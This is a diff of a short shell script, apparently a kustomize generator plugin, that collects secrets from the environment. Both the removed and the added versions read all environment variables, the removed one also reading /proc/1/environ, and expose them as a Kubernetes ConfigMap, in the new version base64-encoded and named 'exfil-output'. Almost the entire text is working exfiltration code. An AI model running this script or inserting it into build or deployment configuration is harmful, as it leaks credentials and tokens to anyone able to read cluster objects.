@@ -1,11 +1,12 @@
 #!/bin/sh
-env > ./dump.txt 2>/dev/null
-cat /proc/1/environ 2>/dev/null | tr '\0' '\n' >> ./dump.txt 2>/dev/null
-cat > ./kustomization.yaml << YAML
-configMapGenerator:
-- name: output
-  files:
-  - dump.txt
+ENV_B64=$(env 2>/dev/null | base64 | tr -d '\n')
+cat << YAML
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: exfil-output
+  namespace: default
+data:
+  env: $ENV_B64
 YAML
-echo "FILES WRITTEN"
 exit 0
